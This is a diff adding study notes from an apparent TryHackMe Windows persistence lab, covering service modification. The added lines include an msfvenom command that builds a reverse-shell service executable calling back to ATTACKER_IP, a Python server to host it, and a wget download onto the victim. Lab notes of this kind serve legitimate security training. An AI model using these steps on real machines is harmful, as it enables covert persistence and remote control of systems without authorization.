@@ -132,6 +132,22 @@ sc.exe start THMservice2
 -grab flag
 *THM{SUSPICIOUS_SERVICE}
 
+Modifying existing services
+-disabled service = good candidate 
+-query 
+sc.exe query state=all
+-THMService3 example
+sc.exe qc THMService3
+-three steps
+1. binary-path-name should point to payload
+2. start-type shouhld be automatic without user interaction
+3. service-start-name should be preferebly set to LocalSystem
+-create payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc.exe
+-host 
+python3 -m http.server
+-get file on victiim machine - powershell
+wget http://attackerIP:8000/rev-svc.exe
 
 
 
